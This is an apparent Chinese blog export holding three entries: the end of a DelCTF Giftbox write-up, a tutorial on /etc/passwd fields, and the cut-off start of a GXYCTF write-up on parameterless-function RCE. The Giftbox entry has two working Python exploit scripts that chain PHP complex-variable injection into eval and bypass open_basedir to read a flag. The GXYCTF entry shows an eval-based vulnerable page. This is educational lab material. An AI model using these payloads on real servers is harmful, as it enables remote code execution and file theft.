<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;img&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag&#x27;</span>));</span><br></pre></td></tr></table></figure></div>

<h2 id="最后exp"><a href="#最后exp" class="headerlink" title="最后exp"></a>最后exp</h2><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">&#x27;GAXG24JTMZXGKZBU&#x27;</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">&#x27;http://link-site/shell.php&#x27;</span>,</span><br><span class="line">                    params=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;&#x27;</span>, <span class="string">&#x27;totp&#x27;</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">targeting</span>(<span class="params">code, position</span>):</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">&#x27;http://link-site/shell.php&#x27;</span>, params=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;targeting &#x27;</span> + code + <span class="string">&#x27; &#x27;</span> + position, <span class="string">&#x27;totp&#x27;</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">launch</span>():</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">&#x27;http://link-site/shell.php&#x27;</span>, params=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;launch&#x27;</span>, <span class="string">&#x27;totp&#x27;</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">destuct</span>():</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">&#x27;http://link-site/shell.php&#x27;</span>, params=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;destruct&#x27;</span>, <span class="string">&#x27;totp&#x27;</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    login()</span><br><span class="line">    destuct()</span><br><span class="line">    targeting(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;chdir&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;img&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;&#123;$a($b)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">&quot;d&quot;</span>, <span class="string">&quot;ini_set&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;open_basedir&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;f&quot;</span>, <span class="string">&quot;..&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;&#123;$d($e,$f)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">&quot;h&quot;</span>, <span class="string">&quot;&#123;$a($f)&#125;&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;i&quot;</span>, <span class="string">&quot;&#123;$a($f)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">&quot;j&quot;</span>, <span class="string">&quot;Ly8v&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;k&quot;</span>, <span class="string">&quot;base64_&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;l&quot;</span>, <span class="string">&quot;decode&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;m&quot;</span>, <span class="string">&quot;$k$l&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;n&quot;</span>, <span class="string">&quot;&#123;$m($j)&#125;&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;o&quot;</span>, <span class="string">&quot;&#123;$d($e,$n)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">&quot;p&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;q&quot;</span>, <span class="string">&quot;file_get&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;r&quot;</span>, <span class="string">&quot;_contents&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;s&quot;</span>, <span class="string">&quot;$q$r&quot;</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">&quot;t&quot;</span>, <span class="string">&quot;&#123;$s($p)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(launch())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">totp=pyotp.TOTP(<span class="string">&#x27;GAXG24JTMZXGKZBU&#x27;</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line">url=<span class="string">&#x27;http://link-site/shell.php&#x27;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span>:totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url,params=params)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">destruct</span>():</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;destruct&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    s.get(url, params=params)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">launch</span>():</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;launch&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span>: totp.now(),</span><br><span class="line">        <span class="comment">#&#x27;w&#x27;:&#x27;&#x27;&#x27;print_r(scandir(&#x27;.&#x27;));&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#img是当前目录的一个文件夹，也可以改为其他当前目录文件夹</span></span><br><span class="line">        <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);readfile(&#x27;/flag&#x27;);&#x27;&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url, params=params)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">targeting</span>(<span class="params">code,pos</span>):</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;targeting &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(code,pos),</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url, params=params)</span><br><span class="line"><span class="built_in">print</span>(login().text)</span><br><span class="line"><span class="comment">###phpinfo测试</span></span><br><span class="line"><span class="comment">#targeting(&#x27;a&#x27;,&#x27;phpinfo&#x27;)</span></span><br><span class="line"><span class="comment">#targeting(&#x27;b&#x27;,&#x27;&#123;$a()&#125;&#x27;)</span></span><br><span class="line"><span class="comment">#print(launch().text)</span></span><br><span class="line">destruct()</span><br><span class="line">targeting(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;&#123;$_GET&#123;w&#125;&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;$&#123;eval($a)&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(launch().text)</span><br></pre></td></tr></table></figure></div>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/wuyanxin/totp.js">TOTP作者算法</a><br><a href="https://blog.csdn.net/chasingin/article/details/104642522/">W4nder师傅的wp</a><br><a href="https://xz.aliyun.com/t/5967">浅析DelCTF web之Giftbox题解</a><br><a href="https://www.zhaoj.in/read-6170.html">赵总的wp</a><br><a href="https://xz.aliyun.com/t/4785">从一道题讲PHP复杂变量</a><br><a href="https://xz.aliyun.com/t/4720">bypass open_basedir的新方法</a></p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>write up</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux /etc/passwd 内容解释</title>
    <url>/yakko117/2020/01/13/Linux_etc_passwd/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="Linux-passwd-文件详解"><a href="#Linux-passwd-文件详解" class="headerlink" title="Linux passwd 文件详解"></a>Linux passwd 文件详解</h1><p>在 <code>Linux /etc/passwd</code> 文件中每个用户都有一个对应的记录行，它记录了这个用户的一些基本属性。系统管理员经常会接触到这个文件的修改以完成对用户的管理工作。</p>
<h2 id="首先先了解一下常见的配置文件"><a href="#首先先了解一下常见的配置文件" class="headerlink" title="首先先了解一下常见的配置文件"></a>首先先了解一下常见的配置文件</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户信息文件: /etc/passwd</span><br><span class="line">密码文件: /etc/shadow</span><br><span class="line">用户组文件: /etc/group</span><br><span class="line">用户组密码文件: /etc/gshadow</span><br><span class="line">用户配置文件</span><br><span class="line">    /etc/login.defs</span><br><span class="line">    /etc/default/useradd</span><br><span class="line">新用户登陆信息文件: /etc/skel</span><br><span class="line">登陆信息: /etc/motd</span><br></pre></td></tr></table></figure></div>

<p>用户管理有两个最重要的配置文件，一个是保存用户信息的文件 <code>/etc/passwd</code>，一个是保存了用户密码的文件 <code>/etc/shadow</code>。</p>
<hr>
<h2 id="x2F-etc-x2F-passwd-文件格式"><a href="#x2F-etc-x2F-passwd-文件格式" class="headerlink" title="&#x2F;etc&#x2F;passwd 文件格式"></a>&#x2F;etc&#x2F;passwd 文件格式</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gavxphxn1fj30mj0b7wgd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gavxphxn1fj30mj0b7wgd.jpg" class="lazyload"></a></p>
<p>从上面的例子我们可以看到，<code>/etc/passwd</code> 中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</span><br></pre></td></tr></table></figure></div>

<h3 id="用户名"><a href="#用户名" class="headerlink" title="用户名"></a>用户名</h3><p>代表用户账号的字符串。通常长度不超过8个字符，并且由<code>大小写字母</code>和<code>/</code>或<code>数字</code>组成。登录名中不能有冒号<code>(:)</code>，因为冒号在这里是分隔符。为了兼容起见，<code>登录名中最好不要包含点字符(.)</code>，并且不使用<code>连字符(-)</code>和<code>加号(+)</code>打头。</p>
<hr>
<h3 id="口令"><a href="#口令" class="headerlink" title="口令"></a>口令</h3><p>一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于<code>/etc/passwd</code>文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到 <code>/etc/shadow</code>文件中，而在 <code>/etc/passwd</code> 文件的口令字段中只存放一个特殊的字符，例如**”x”<strong>或者</strong>“*“**，这里的 <strong>“x”</strong> 代表的是密码标志，而不是真正的密码，真正的密码是保存在 <code>/etc/shadow</code> 文件中的、。 </p>
<hr>
<h3 id="用户标识号-UID"><a href="#用户标识号-UID" class="headerlink" title="用户标识号 UID"></a>用户标识号 UID</h3><p>是一个整数，系统内部用它来标识用户。一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把它们视为同一个用户，但是它们可以有不同的口令、不同的主目录以及不同的登录Shell等。通常用户标识号的取值范围是0～65535。</p>
<table>
<thead>
<tr>
<th>UID范围</th>
<th>用户身份</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>超级用户 UID。UID 为 0 就代表这个账号是管理员账号。在 Linux 中，如何把普通用户升级成管理员呢？只需把其他用户的 UID 修改为 0 就可以了，这一点和 Windows 是不同的。不过不建议建立多个管理员账号。</td>
</tr>
<tr>
<td>1~499</td>
<td>系统用户（伪用户）。也就是说，此范围的 UID 保留给系统使用。其中，1<del>99 用于系统自行创建的账号；100</del>499 分配给有系统账号需求的用户。其实，除了 <code>0</code> 之外，其他的 UID 并无不同，这里只是默认 500 以下的数字给系统作为保留账户，只是一个公认的习惯而已。</td>
</tr>
<tr>
<td>500~65535</td>
<td>普通用户。通常这些 UID 已经足够用户使用了。但不够用也没关系，2.6.x 内核之后的 Linux 系统已经可以支持 $2^{32}$ 个 UID 了。</td>
</tr>
</tbody></table>
<hr>
<h3 id="组标识号-GID"><a href="#组标识号-GID" class="headerlink" title="组标识号 GID"></a>组标识号 GID</h3><p>字段记录的是用户所属的用户组。它对应着 <code>/etc/group</code> 文件中的一条记录。<br>全称 <code>&quot;Group ID&quot;</code>，简称 <code>&quot;组ID&quot;</code>，表示用户初始组的组 ID 号。这里需要解释一下初始组和附加组的概念。</p>
<ul>
<li><p><code>初始组</code>，指用户登陆时就拥有这个用户组的相关权限。每个用户的初始组只能有一个，通常就是将和此用户的用户名相同的组名作为该用户的初始组。比如说，我们手工添加 <code>用户 yakko</code>，在建立 <code>用户 yakko</code> 的同时，就会建立 <code>yakko 组</code>作为 <code>yakko 用户</code> 的初始组。</p>
</li>
<li><p><code>附加组</code>，指用户可以加入多个其他的用户组，并拥有这些组的权限。每个用户只能有一个初始组，除初始组外，用户再加入其他的用户组，这些用户组就是这个用户的附加组。附加组可以有多个，而且用户可以有这些附加组的权限。</p>
</li>
</ul>
<p>举例来说，刚刚的 <code>yakko 用户</code>除属于初始组 yakko 外，我又把它加入了 users 组，那么 yakko 用户<code>同时属于 yakko 组和 users 组</code>，其中 yakko 是初始组，users 是附加组。</p>
<p>当然，初始组和附加组的身份是可以修改的，但是我们在工作中不修改初始组，只修改附加组，因为修改了初始组有时会让管理员逻辑混乱。</p>
<p>需要注意的是，在 <code>/etc/passwd</code> 文件的第四个字段中看到的 ID 是这个用户的初始组。</p>
<hr>
<h3 id="注释性描述"><a href="#注释性描述" class="headerlink" title="注释性描述"></a>注释性描述</h3><p>字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等，这个字段并没有什么实际的用途。在不同的Linux系统中，这个字段的格式并没有统一。在许多Linux系统中，这个字段存放的是一段任意的注释性描述文字，用做finger命令的输出。</p>
<h3 id="主目录-和-Shell"><a href="#主目录-和-Shell" class="headerlink" title="主目录 和 Shell"></a>主目录 和 Shell</h3><p>也就是用户的起始工作目录，它是用户在登录到系统之后所处的目录。<br>在大多数系统中，各用户的主目录都被组织在同一个特定的目录下，而用户主目录的名称就是该用户的登录名。<br>各用户对自己的主目录有读、写、执行（搜索）权限，其他用户对此目录的访问权限则根据具体情况设置。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户登录后，要启动一个进程，负责将用户的操作传给内核</span><br><span class="line">这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。</span><br><span class="line">Shell是用户与Linux系统之间的接口。</span><br></pre></td></tr></table></figure></div>

<p>Linux的Shell有许多种，每种都有不同的特点。常用的有以下几种:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh(BourneShell) csh(CShell)</span><br><span class="line">ksh(KornShell)  tcsh(TENEX/TOPS-20typeCShell)</span><br><span class="line">bash(BourneAgainShell)等。</span><br></pre></td></tr></table></figure></div>
<p>系统管理员可以根据系统情况和用户习惯为用户指定某个Shell。<br>如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为<code>/bin/sh</code>。<br>用户的登录Shell也可以指定为某个特定的程序（此程序不是一个命令解释器）。<br>利用这一特点，我们可以限制用户只能运行指定的应用程序，在该应用程序运行结束后，用户就自动退出了系统。有些Linux系统要求只有那些在系统中登记了的程序才能出现在这个字段中。系统中有一类用户称为伪用户（psuedousers）<br>用户在Linux <code>/etc/passwd</code> 文件中也占有一条记录，但是不能登录，因为它们的登录Shell为空。它们的存在主要是方便系统管理，满足相应的系统进程对文件属主的要求。常见的伪用户如下所示。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin         拥有可执行的用户命令文件</span><br><span class="line">sys         拥有系统文件</span><br><span class="line">adm         拥有帐户文件</span><br><span class="line">uucp        UUCP使用</span><br><span class="line">lplp或lpd   子系统使用</span><br><span class="line">nobody      NFS使用</span><br></pre></td></tr></table></figure></div>

<p>除了上面列出的伪用户外，还有许多标准的伪用户，例如：audit,cron,mail,usenet等，它们也都各自为相关的进程和文件所需要。</p>
<p>由于 <code>Linux /etc/passwd</code> 文件是所有用户都可读的，如果用户的密码太简单或规律比较明显的话，一台普通的计算机就能够很容易地将它破解，因此对安全性要求较高</p>
<p>的Linux系统都把加密后的口令字分离出来，单独存放在一个文件中，这个文件是 <code>/etc/shadow</code> 文件。只有超级用户才拥有该文件读权限，这就保证了用户密码的安全性。</p>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><a href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;passwd内容解释</a><br><a href="https://www.linuxidc.com/Linux/2018-11/155322.htm">Linux中&#x2F;etc&#x2F;passwd文件详细解析</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>通过一道题学习无参数RCE</title>
    <url>/yakko117/2020/02/05/GXY%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>题目是 <a href="https://buuoj.cn/challenges#[GXYCTF2019]%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">[GXYCTF2019]禁止套娃</a><br>正好借此来学习一下新知识</p>
<span id="more"></span>

<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>官方给的 <strong>Hint:</strong> <code>GitHack 了解一下</code><br>行吧，那就去拿源码 (小声bb自己的字典太垃圾了，没跑出来)</p>
<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>看下正则匹配，<code>(?R)</code> 意味引用整个正则表达式<br><code>是引用正则表达式，而不是引用正则表达式匹配到的结果</code><br>后面加了 <code>?</code> 进行递归调用。<br>因此只能匹配通过无参数的函数</p>
<hr>
<h2 id="首先得先知道些东东"><a href="#首先得先知道些东东" class="headerlink" title="首先得先知道些东东"></a>首先得先知道些东东</h2><p>假如存在以下一句话</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>

<p>那么我们可以直接 <code>getshell</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lvmk3j30c70gp78v.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lvmk3j30c70gp78v.jpg" class="lazyload"></a></p>
<p>但是如果存在以下限制</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们使用参数则无法通过正则的校验</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/[^\W]+\((?R)?\)/</span><br></pre></td></tr></table></figure></div>

<p>这种正则，就是我们说的无参数函数的校验<br>其只允许执行类似下面这种格式函数，</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A(B(C()));</span><br><span class="line">A();</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">但是不允许进行参数添加：</span><br><span class="line">A(&#x27;123&#x27;);</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="如何得到-flag-php-文件名"><a href="#如何得到-flag-php-文件名" class="headerlink" title="如何得到 flag.php 文件名"></a>如何得到 flag.php 文件名</h2><p>通过拜读飘零师傅的文章，知道了可以利用 <code>getallheaders()</code> 拿到环境变量<br>使自己传参的参数变为可控的，进而执行命令。</p>
<p>也可以利用常规方法，从找个函数来返回 <code>flag.php</code> 文件名<br><code>scandir()</code> 函数可以扫描当前目录下的文件，例如：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>按照飘零师傅的思路，利用 <code>getcwd()</code> 获得当前目录，<code>scandir(getcwd())</code> 获得当前目录的文件。<br>而如果要往上层目录看的话，就利用<code>dirname()</code>，使用<code>scandir(dirname(getcwd()))</code>。<br>但是这里的 <code>et</code> 被过滤，所以我们要找其他的方法</p>
<p>因此 <code>scandir</code> 的 <code>.</code>  如何利用成了问题</p>
<h3 id="通过利用-current-localeconv"><a href="#通过利用-current-localeconv" class="headerlink" title="通过利用 current(localeconv())"></a>通过利用 current(localeconv())</h3><p><code>localeconv()</code> 函数返回一包含本地数字及货币格式信息的数组</p>
